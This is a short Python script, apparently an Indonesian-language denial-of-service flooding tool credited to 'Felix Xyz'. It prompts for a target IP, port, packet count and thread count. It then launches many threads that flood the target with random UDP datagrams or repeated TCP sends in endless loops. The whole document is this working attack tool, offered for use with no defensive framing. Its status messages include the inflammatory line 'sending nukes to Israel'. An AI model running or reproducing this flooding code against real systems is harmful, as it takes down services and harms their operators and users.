import random
import socket
import threading
import os
import time
import sys

os.system("clear")
print(" Felix Xyz Xalbador Community ")
print(" ============>>>> Follow My Github Xwell1 <<<<=============")
print(" --------------=+++++= Felix Xyz =+++++=-------------- ")
print(" [ Author : Felix Xyz ] ")
                
os.system("clear")
print(" ====== Masukan IP Server Target ======")
ip = str(input(" Masukan Virus IP Target: "))
print(" ====== Masukan Port Server Target ======= ")
port = int(input(" Masukan Virus Port Server: "))
print(" ====== Apakah Anda Siap Mengirim Virus ====== ")
choice = str(input(" Siap menyerang?(y/n): "))
print(" ====== Masukan Jumlah Paket Virus ====== ")
times = int(input(" Masukan Packets Virus: "))
print(" ====== Masukan Jumlah Kecepatan Virus ====== ")
threads = int(input(" Masukan Threads Virus: "))
def run():
  data = random._urandom(1010)
  i = random.choice(("[Xal]","[Xal]","[Xal]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" |======== Mengirim Nuklir Ke Israel ======== |")
    except:
      print("[!] | ======== Mengirim Nuklir ke israel ======== |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[Xal]","[Xal]","[Xal]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +"  [====== Felix Xyz ======] ")
    except:
      s.close()
      print("[*] =======] Virus Detected Stop Connection Wkwkwkwk ====== ] ")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()